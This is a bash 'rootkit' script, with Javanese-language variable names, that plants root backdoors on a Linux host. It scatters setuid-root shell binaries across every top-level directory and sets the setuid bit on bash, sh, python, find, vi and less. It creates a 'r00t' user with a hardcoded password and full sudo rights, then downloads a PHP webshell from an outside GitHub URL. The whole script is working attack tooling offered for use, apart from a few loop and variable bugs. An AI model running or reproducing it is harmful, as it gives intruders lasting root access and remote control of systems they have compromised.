#!/bin/bash

rampung='\033[0m'
abang='\033[1;31m'
ijo='\033[1;32m'
kuning='\033[1;33m'
putih='\033[1;37m'
curr_dir=$(dirname "$(realpath "$0")")

check_root(){
	uid=$(id -u)
	gid=$(id -g)
	echo "[+] User ID	: $uid"
	echo "[+] Group ID	: $uid"
	if [[ $uid == 0 ]]
	then
		echo -ne "$ijo[+] You are Root!\n[+] Trying to plan rootkit...\n\n $rampung\n"
		sleep 1
	else
		echo -ne "$abang[+] Not root!\n[+] Must Run as Root! $rampung\n"
		exit
	fi
}

binary_rootkit(){

cat << EOF > /tmp/rootkitninja.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main(){
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF

gcc /tmp/rootkitninja.c -o /tmp/rootkitninja
rm /tmp/rootkitninja.c

}

share_binroot(){
	root_dir=$(ls /)
	mkdir /.,

	for i in $root_dir
	do
		if [[ -d /$i ]]
		then
			if [[ $i == tmp ]]
				then
					echo -ne "$ijo[+] Share rootkit in Directory : $i $rampung\n"
					cp /tmp/rootkitninja /$i/.rootkitninja
					chmod +s /$i/rootkitninja
					chmod +s /$i/.rootkitninja
			else
				echo -ne "$ijo[+] Share rootkit in Directory : $i $rampung\n"
				cp /tmp/rootkitninja /$i/rootkitninja
				cp /tmp/rootkitninja /$i/.rootkitninja
				chmod +s /$i/rootkitninja
				chmod +s /$i/.rootkitninja
			fi
		fi
	done
}

python_stickybit(){
	chmod +s /usr/bin/python
	chmod +s /usr/bin/python?
	chmod +s /usr/bin/python???

	root_py=$(ls /usr/bin/python /usr/bin/python? /usr/bin/python???)
	for i in $root_py
	do
		echo -ne "$ijo[+] Add Python Sticky Bit in Python Version : $i $rampung\n"
	done
}

app_r00t(){
	echo -ne "$ijo[+] Add Sticky Bit to find binary $rampung\n"
	echo -ne "$ijo[+] Add Sticky Bit to vi $rampung\n"
	echo -ne "$ijo[+] Add Sticky Bit to less $rampung\n"
	echo -ne "$ijo[+] Add Sticky Bit Bash $rampung\n"
	echo -ne "$ijo[+] Add Sticky Bit SH $rampung\n"
	chmod +s /bin/bash
	chmod +s /bin/sh
	chmod +s /usr/bin/find
	chmod +s /usr/bin/vi
	chmod +s /usr/bin/less
	sleep 2
}

adduser_r00t(){
	echo -ne "\n$putih[+] Create New User equal with root... $rampung\n"
	echo -ne "[+] Username	: r00t"
	echo -ne "[+] Password	: r00tkitninja" 
	echo -ne "r00tkitninja\nr00tkitninja\n\n\n\n\n" | adduser r00t
	echo -ne "\nr00t	ALL=(ALL:ALL) ALL\n" >> /etc/sudoers
}

spawn_webroot(){
	root_dir=$(ls /)
	for c in $root_dir
	do
		if [[ -d /$c ]]
		then
			echo -ne "$ijo[+] Spawn root with Binary Shell from Directory : $c$rampung\n"
			/$i/rootkitninja
			/$i/.rootkitninja
		fi
	done
	root_py=$(ls /usr/bin/python /usr/bin/python? /usr/bin/python???)
	for i in $root_py
	do
		echo -ne "$ijo[+] Spawn root with Python Version : $i$rampung\n"
		$i -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh"); os.system("/bin/bash")'
	done
	echo -ne "$ijo[+] Trying spawn using Bash...$rampung\n"
	bash -p
	echo -ne  "$ijo[+] Trying spawn using SH...$rampung\n"
	sh -p
	echo -ne "$ijo[+] Trying spawn using Find...$rampung\n"
	touch .,; find ., -exec /bin/sh \;
	wget https://raw.githubusercontent.com/ortod0x/rootkitninja_webshell/main/rootkitninja.php -O $curr_dir/r00ted.php
	echo -ne "Rooted Shell Spawned in $curr_dir/r00ted.php"
}

check_root
binary_rootkit
share_binroot
python_stickybit
app_r00t
adduser_r00t
spawn_webroot
